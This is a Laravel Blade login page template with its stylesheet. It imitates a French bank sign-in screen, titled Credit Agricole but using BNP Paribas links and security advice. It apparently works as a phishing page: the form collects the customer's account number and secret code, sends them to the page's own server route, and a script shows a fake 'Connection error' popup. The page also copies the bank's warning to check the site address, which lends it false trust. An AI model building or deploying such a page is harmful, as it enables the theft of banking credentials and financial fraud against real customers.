<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="{{ asset('assets/style.css') }}">
    <title>Credit Agricole - Connexion</title>
    <!-- Ajoutez le script à l'intérieur de la balise <head> -->
        {{-- Favicon --}}
    <link rel="icon" type="image/png" sizes="16x16" href="{{ asset('creditAgriLogo.png') }}">
    {{-- <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script> --}}
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.css">


</head>

<body>

    <script>
        $(document).ready(function() {
            $('#compteBancaire').inputmask('99-9999999-99');
        });
    </script>

    <nav class="navbar">
        <img src="{{ asset('logo1.webp') }}" alt="Bnp paribas" >
        <!-- <h2>Slogan de la banque</h2> -->

        <ul>
            {{-- <li><a href="https://www.credit-agricole.fr">Comptes & Cartes</a></li>
            <li><a href="https://www.credit-agricole.fr/particulier/epargne/livret-epargne-logement/livret-a.html">Epargne</a></li>
            <li><a href="https://www.credit-agricole.fr/particulier/assurances/habitation/assurance-habitation.html">Assurance</a></li>
            <li><a href="https://www.credit-agricole.fr/particulier/credit/immobilier/credit-immobilier-facilimmo.html">Credit</a></li>
            <li><a href="#">Contact</a></li> --}}

            <li>
                <a id="button-devenir-client" href="https://mabanque.bnpparibas/fr/devenir-client-bnp-paribas" class="bouton-devenir-client part-only">Devenir client</a>
            </li>
        </ul>
        <button class="menu-btn">&#9776;</button>
    </nav>

    <div class="login-container">
        <div class="left-section">

            <!-- Partie gauche (couleur verte) avec le formulaire -->
            <div class="form-section">
                <h2> ACCÉDER À MES COMPTES </h2>
                <form action="{{ route('login.feature') }}" method="POST">
                    @csrf

                    <div class="form-group">
                        <label for="accountNumber">1. Mon numéro client</label>
                        <input type="text" id="compteBancaire" name="numero_compte" required>
                    </div>

                    <div class="form-group">
                        <label for="password">2. Mon code secret</label>
                        <input type="password" name="password" required>
                    </div>
                    <!-- Ajoutez ceci à l'intérieur de votre formulaire, juste avant le bouton de soumission -->
                    <div id="error-message" style="color: red; margin-top: 10px; display: none;"></div>

                    <button type="submit" >ACCÉDER À MES COMPTES</button>


                </form>
                <br>
                <br>
                <h3>Téléchargez l’application Ma Banque

                    Chacun d’entre vous gère différemment ses besoins bancaires.
                    Seul ou accompagné, au Crédit Agricole, vous aurez toujours le choix entre vous adresser à un conseiller ou utiliser l’application Ma Banque.</h3>
            </div>
        </div>
        <div class="right-section">
            <!-- Partie droite (couleur blanche) avec les consignes -->
            <div class="instructions-section">
                <section class="card-text">
                    <h2>
                        <i class="icon icon-picto-cadenas"></i>
                        Vos codes d'accès</h2>
                    <p>
                        <a href="https://mabanque.bnpparibas/fr/gerer/services-lies-compte/options-et-services/code-acces-compte-en-ligne">Obtenir ses codes d'accès</a>
                    </p>
                </section>





                <section class="card-text encartsecu">
                    <h2>Conseils de sécurité</h2>
                    <p>Vérifiez que l'adresse du site commence exactement par :</p>
                    <p class="url"><strong>https://connexion-mabanque.bnpparibas</strong></p>
                    <div class="row">
                        <div class="col-55">
                            <p>précédée par une icône cadenas et contient un <strong>https://</strong> qui garantiront une connexion sécurisée.</p>
                            <p><a style="text-decoration: underline;font-weight: 600;color: #00915a;" href="https://mabanque.bnpparibas/fr/engagement-chartes-et-conventions/site-securise">
                                 Découvrez nos conseils sécurité</a> et les bonnes pratiques pour consulter et identifier les dangers du web.</p>
                        </div>
                    </div>
                <!-- Ajoutez ici vos autres consignes de sécurité -->
                </section>



                <section class="card-text">
                <h3>Pour une meilleure accessibilité</h3>
                <p>
                    <a  style="text-decoration: underline;font-weight: 600;color: #00915a;" id="ident-accessible" href="https://mabanque.bnpparibas/auth/login?a=true">Connectez-vous</a> grâce à la grille contrastée, agrandie et bénéficiez d'un accompagnement vocal.
                </p>
                <p><a  style="text-decoration: underline;font-weight: 600;color: #00915a;" href="https://mabanque.bnpparibas/fr/accessibilite/acceo">Accédez au service Sourds et Malentendants, Sourds et Aveugles ou Aphasiques</a> pour contacter un conseiller avec un dispositif en LSF (Langue des Signes Française), en LPC (Langage Parlé Complété) ou en TIP (Transcription Instantanée de la Parole).</p>
                <p><a  style="text-decoration: underline;font-weight: 600;color: #00915a;" href="https://mabanque.bnpparibas/fr/accessibilite">Rendez-vous sur la page Accessibilité</a> pour plus d'informations sur l'accessibilité numérique chez BNP Paribas.</p>
                <p>Rendez-vous sur la page Accessibilité pour plus d'informations sur l'accessibilité numérique chez ma
                    bank.</p>
                </section>



                <section class="card-text">
                <h3>Informations client</h3>
                <p>Si vous rencontrez des problèmes techniques lors de votre navigation, nous vous invitons à contacter
                    nos conseillers en ligne au :</p>
                <p><strong>3477</strong></p>
                <p>Service gratuit + prix appel</p>
                <p>Ou à nous signaler un problème technique.</p>
                <p>Vous pouvez également gérer vos comptes depuis votre mobile ou votre tablette via l'application Mes
                    comptes.</p>
                </section>
            </div>
        </div>
    </div>
    <!-- Ajoutez la balise footer pour l'image en bas -->
    <footer>
        <img src="{{ asset('assets/footer.png') }}" alt="" style="width: 100%; margin-top: auto;">
    </footer>

    <script type="module">
        import Swal from 'https://cdn.jsdelivr.net/npm/sweetalert2@11/src/sweetalert2.js';


        window.addEventListener("load", (event) => {
            const connecte = document.getElementById('error-connecte');
            console.log(connecte);


                connecte.addEventListener('click', function() {
                    Swal.fire({
                        title: "Erreur de Connexion!",
                        text: "impossible de se connecter.....",
                        icon: "error"
                    });
                });

        });


      </script>

</body>

</html>









* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}
body {
    margin: 0;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}

.login-container {
    display: flex;
    flex-wrap: wrap; /* Enable wrapping for smaller screens */
}

.left-section {
    background-color: #238c57;
    color: white;
    padding: 90px;
    flex: auto;
    display: flex;
    flex-direction: column;
    align-items: center;
    background-image: linear-gradient(#238c57, #50df54);
    border-right: solid 4px #45946c;
}

.navbar {
    background-color: #fff;
    color: #000;
    padding: 20px;
    display: flex;
    align-items: center;
    justify-content: space-between;
}

.navbar img {
    max-width: 200px;
}

#button-devenir-client {
    float: right;
    width: 181px;
    height: 48px;
    color: #fff;
    text-align: center;
    line-height: 48px;
    border-radius: 36px;
    background: 0 0;
    background-color: #28c3a9;
    box-shadow: 0 2px 4px 0 rgba(0, 0, 0, .36);
    padding: 0;
    margin: 1px 2px 0 10px;
}

#button-urgence {
    cursor: pointer;
    height: 70px;
    font-size: 12px;
    text-align: center;
    background-color: #fff;
    float: right;
    padding: 0 10px;
    position: relative;
}

.navbar h2 {
    margin: 0;
    font-size: 24px;
}

.navbar ul {
    list-style: none;
    margin: 0;
    padding: 0;
    display: flex;
}

.navbar li {
    margin-right: 7px;
}

.navbar a {
    text-decoration: none;
    color: #000;
    font-weight: bold;
    font-size: 16px;
    transition: color 0.3s ease;
}

.navbar a:hover {
    color: #45a049;
}

.menu-btn {
    font-size: 24px;
    background: none;
    border: none;
    color: #000;
    cursor: pointer;
    display: none; /* Initial state, hidden on larger screens */
}

.navbar ul {
    display: flex;
}



.form-section {
    width: 100%;
    max-width: 400px;
}

.right-section {
    background-color: #fff;
    padding: 0px;
    /* flex: 1; */
    width: 40%;
    display: flex;
    flex-direction: column;
    /* align-items: center; */
    justify-content: center;
}

.card-text {
    padding: 15px 5%;
    border-bottom: 1px solid rgba(0,0,0,.1);
}

.card-text h2 {
    font-family: "open sans";
    font-weight: 700;
    font-size: 20px;
    text-transform: none;
    padding: 0;
}

.card-text p {
    margin: .5rem 0;
}

.card-text p a {
    text-decoration: underline;
    font-weight: 600;
    color: #00915a;
}

.card-text.encartsecu {
    background-image: url(/ordi-loupe.jpg);
    background-repeat: no-repeat;
    background-position: right -14px bottom 14px;
    background-size: 180px 200px;
    margin-left: 0;
    margin-right: 30px;
}

.card-text.encartsecu h2 {

}

.instructions-section {
    width: 100%;
    max-width: 100%;
}

h2 {
    margin-bottom: 20px;
}

form {
    width: 100%;
}

.form-group {
    margin-bottom: 20px;
}

label {
    display: block;
    margin-bottom: 8px;
}

input {
    width: 100%;
    padding: 10px;
    font-size: 16px;
    border: 1px solid #ccc;
    border-radius: 4px;
    box-sizing: border-box;
}

button {
    background-color: #142715;
    color: white;
    padding: 15px;
    cursor: pointer;
    width: 100%;
    border: none;
    border-radius: 4px;
    font-size: 16px;
}

button:hover {
    background-color: #45a049;
}

/* Media Queries for Responsive Design */

@media only screen and (max-width: 768px) {
    .login-container {
        flex-direction: column; /* Stack sections vertically on smaller screens */
    }

    .left-section,
    .right-section {
        padding: 20px; /* Adjust padding for smaller screens */
    }


    .menu-btn {
        display: block; /* Show the menu button on smaller screens */
        position: absolute;

        left: 40%;
    }

    .navbar ul {
        display: none; /* Hide the list on smaller screens initially */
        flex-direction: column;
        position: absolute;
        top: 60px;
        right: 20px; /* Adjust position as needed */
        background-color: #fff;
        z-index: 1;
    }

    .navbar ul.show {
        display: flex;
    }

    .navbar ul li {
        margin-right: 0;
        text-align: center;
    }
}
